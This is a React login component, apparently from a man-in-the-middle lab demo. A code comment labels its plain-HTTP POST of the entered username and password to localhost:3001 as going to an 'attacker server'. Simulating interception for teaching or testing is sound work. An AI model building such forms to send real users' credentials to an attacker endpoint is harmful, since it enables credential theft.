import React, { useState } from "react";
import axios from "axios";

const LoginPage = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleLogin = async () => {
    setMessage("");

    try {
      // Send login request to attacker server (MITM attack simulation)
      const response = await axios.post("http://localhost:3001/login", {
        username,
        password,
      });
      setMessage(response.data);
    } catch (error) {
      setMessage("Login failed!");
    }
  };

  return (
    <div className="login-container">
      <div className="login-form">
        <h1>Login Page</h1>
        <div className="input-group">
          <input
            type="text"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>
        <div className="input-group">
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>
        <div>
          <button onClick={handleLogin}>Login</button>
        </div>
        {message && (
          <div
            className={`message ${
              message.includes("failed") ? "error" : "success"
            }`}
          >
            {message}
          </div>
        )}
      </div>
    </div>
  );
};

export default LoginPage;
